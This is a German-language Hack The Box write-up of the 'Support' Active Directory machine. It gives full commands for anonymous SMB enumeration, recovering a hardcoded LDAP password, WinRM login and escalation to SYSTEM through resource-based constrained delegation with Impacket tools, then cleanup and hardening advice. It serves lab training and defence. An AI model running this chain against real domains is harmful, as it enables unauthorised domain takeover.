# Hack The Box: Support Writeup

Flags sind absichtlich nicht enthalten.

## Überblick

Support ist eine Easy-Windows-Maschine in einer kleinen Active-Directory-Umgebung (`support.htb`). Die Chain beginnt mit anonymem SMB-Zugriff auf ein internes Support-Tool. Durch statische Analyse des .NET-Tools lassen sich LDAP-Credentials rekonstruieren. LDAP-Enumeration offenbart anschließend ein Passwort im `info`-Attribut eines Users, wodurch WinRM-Zugriff möglich wird.

Die Privilege Escalation erfolgt über eine AD-ACL-Fehlkonfiguration: Die Gruppe `Shared Support Accounts` hat `GenericAll` auf dem Domain-Controller-Computerobjekt. Mit MachineAccountQuota und Resource-Based Constrained Delegation (RBCD) lässt sich ein Administrator-Service-Ticket für den DC erzeugen und als SYSTEM ausführen.

## Recon

Full-Port-Recon zeigte einen Windows Domain Controller:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

Wichtige Namen:

```text
Domain: support.htb
DC:     dc.support.htb
Host:   DC
```

## SMB Enumeration

Anonymer SMB-Zugriff zeigte eine interessante Freigabe:

```bash
smbclient -L //10.129.5.140 -N
smbclient //10.129.5.140/support-tools -N
```

In `support-tools` lag unter anderem:

```text
UserInfo.exe.zip
```

Das Archiv enthielt ein .NET-Tool, das für die weitere Chain entscheidend war.

## Foothold

Nach dem Entpacken wurde `UserInfo.exe` statisch analysiert. In den .NET User Strings waren unter anderem folgende Hinweise enthalten:

```text
LDAP://support.htb
support\\ldap
armando
```

Das Tool enthielt außerdem einen verschlüsselten Passwort-Blob. Die Passwort-Routine war keine starke Kryptographie, sondern ein einfacher Decode-Mechanismus aus Base64 und XOR/Byte-Maske. Durch Nachbauen der Routine ließ sich das LDAP-Passwort für `support\\ldap` rekonstruieren.

Der LDAP-Bind wurde geprüft:

```bash
ldapwhoami -x -H ldap://10.129.5.140 -D 'support\\ldap' -w '<REDACTED>'
```

Danach wurden User-Attribute enumeriert:

```bash
ldapsearch -x -H ldap://10.129.5.140 \
  -D 'support\\ldap' -w '<REDACTED>' \
  -b 'DC=support,DC=htb' \
  '(&(objectClass=user)(!(objectClass=computer)))' \
  sAMAccountName memberOf description info servicePrincipalName
```

Interessant war der User `support`:

```text
sAMAccountName: support
info: <REDACTED>
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

Das `info`-Attribut enthielt ein Passwort, und die Mitgliedschaft in `Remote Management Users` erlaubte WinRM-Zugriff:

```bash
evil-winrm -i 10.129.5.140 -u support -p '<REDACTED>'
```

Damit konnte die User-Flag gelesen werden.

## AD Enumeration

Mit den `support`-Credentials wurde BloodHound/LDAP gesammelt:

```bash
bloodhound-python -u support -p '<REDACTED>' \
  -d support.htb -dc dc.support.htb -ns 10.129.5.140 \
  -c All --zip --dns-tcp
```

Die relevante Fehlkonfiguration:

```text
support ∈ Shared Support Accounts
Shared Support Accounts --GenericAll--> DC$
```

Zusätzlich war MachineAccountQuota gesetzt:

```bash
ldapsearch -x -H ldap://10.129.5.140 \
  -D 'support\\support' -w '<REDACTED>' \
  -b 'DC=support,DC=htb' '(objectClass=domainDNS)' \
  ms-DS-MachineAccountQuota
```

Ergebnis:

```text
ms-DS-MachineAccountQuota: 10
```

Damit war RBCD gegen den DC möglich.

## Privilege Escalation: RBCD

Ein temporäres Machine Account wurde erstellt:

```bash
addcomputer.py \
  -computer-name 'TEMPBOX$' \
  -computer-pass '<REDACTED>' \
  -dc-ip 10.129.5.140 \
  'support.htb/support'
```

Danach wurde Resource-Based Constrained Delegation auf dem DC-Computerobjekt gesetzt:

```bash
rbcd.py \
  -delegate-from 'TEMPBOX$' \
  -delegate-to 'DC$' \
  -dc-ip 10.129.5.140 \
  -action write \
  'support.htb/support'
```

Anschließend wurde ein S4U-Ticket für `Administrator` auf `cifs/dc.support.htb` angefordert:

```bash
getST.py \
  -spn cifs/dc.support.htb \
  -impersonate Administrator \
  -dc-ip 10.129.5.140 \
  'support.htb/TEMPBOX$:REDACTED'
```

Das Ticket wurde mit Impacket verwendet:

```bash
KRB5CCNAME='Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache' \
psexec.py -k -no-pass \
  -dc-ip 10.129.5.140 \
  -target-ip 10.129.5.140 \
  support.htb/Administrator@dc.support.htb
```

Die Ausführung lief als:

```text
nt authority\\system
```

Damit konnte die Root-Flag gelesen werden.

## Cleanup

Nach erfolgreichem Root wurden die Änderungen entfernt:

```bash
rbcd.py \
  -delegate-from 'TEMPBOX$' \
  -delegate-to 'DC$' \
  -dc-ip 10.129.5.140 \
  -action remove \
  'support.htb/support'

rbcd.py \
  -delegate-to 'DC$' \
  -dc-ip 10.129.5.140 \
  -action read \
  'support.htb/support'
```

Die RBCD-Property war danach leer. Das temporäre Machine Account wurde ebenfalls gelöscht und per LDAP-Abfrage als nicht mehr vorhanden verifiziert.

## Kill Chain

```text
anonymous SMB
→ support-tools share
→ UserInfo.exe.zip
→ .NET static analysis
→ recover LDAP bind password
→ LDAP enum user attributes
→ support user password in info attribute
→ WinRM as support
→ BloodHound/LDAP ACL enum
→ GenericAll on DC$ via Shared Support Accounts
→ MachineAccountQuota allows temp computer
→ RBCD on DC$
→ S4U2Proxy Administrator to CIFS/DC
→ psexec as SYSTEM
```

## Takeaways

- Interne Support-Tools auf SMB immer herunterladen und statisch analysieren.
- .NET User Strings reichen oft aus, um Endpoints, Service-Accounts und Keys zu finden.
- LDAP-Attribute wie `info`, `description` und `comment` gezielt prüfen.
- `GenericAll` auf Computerobjekte ist in AD sehr kritisch.
- MachineAccountQuota + RBCD bleibt ein schneller Weg von niedrigprivilegiertem Domain-User zu SYSTEM auf dem Zielcomputer.

## Empfehlungen

- Keine Credentials in LDAP-Feldern wie `info` oder `description` speichern.
- Anonymous SMB-Freigaben vermeiden oder stark einschränken.
- Interne Tools nicht mit hartcodierten Credentials ausliefern.
- AD-ACLs regelmäßig prüfen, insbesondere Rechte auf Computerobjekten.
- MachineAccountQuota auf `0` setzen, wenn normale User keine Computer joinen müssen.
- RBCD-relevante Attribute wie `msDS-AllowedToActOnBehalfOfOtherIdentity` überwachen.
